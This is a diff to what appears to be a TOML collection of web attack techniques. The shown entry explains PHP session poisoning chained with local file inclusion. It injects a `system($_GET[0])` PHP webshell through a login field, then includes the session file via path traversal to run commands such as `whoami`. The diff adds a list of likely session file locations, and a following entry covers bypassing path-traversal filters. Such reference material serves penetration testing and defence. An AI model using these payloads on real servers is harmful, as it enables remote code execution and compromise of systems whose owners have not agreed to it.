@@ -113,7 +113,14 @@ login=1&user=<?php system($_GET[0]);?>&pass=password
 This will generate a PHPSESSID cookie. Copy it's value and use LFI to include the PHP session file:
 
 example.com/view.php?file=../../../tmp/sess_i56kgbsq9rm8ndg3qbarhsbm27&0=whoami
-example.com/view.php?file=../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27&0=whoami"""
+example.com/view.php?file=../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27&0=whoami
+
+The following paths are possible:
+/var/tmp/
+/tmp/
+/var/lib/php5/
+/var/lib/php/
+C:\windows\temp\sess_ """
 
 [[data]]
 description = "Bypass non-recursively stripped path traversal sequence defense"
